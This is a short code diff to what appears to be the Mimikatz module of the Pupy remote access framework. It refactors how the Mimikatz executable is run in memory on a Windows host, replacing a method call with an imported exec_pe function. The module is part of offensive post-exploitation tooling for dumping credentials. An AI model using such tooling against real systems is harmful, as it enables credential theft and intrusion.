@@ -9,6 +9,7 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 import time
 from modules.memory_exec import MemoryExec
 import os.path
+from modules.lib.windows.memory_exec import exec_pe
 __class_name__="Mimikatz"
 
 @config(cat="exploit", compat="windows")
@@ -39,6 +40,6 @@ class Mimikatz(MemoryExec):
 			interactive=True
 			timeout=10
 
-		self.exec_pe(mimikatz_path, mimikatz_args, interactive=interactive, fork=False, timeout=timeout)
+		exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
 				
 
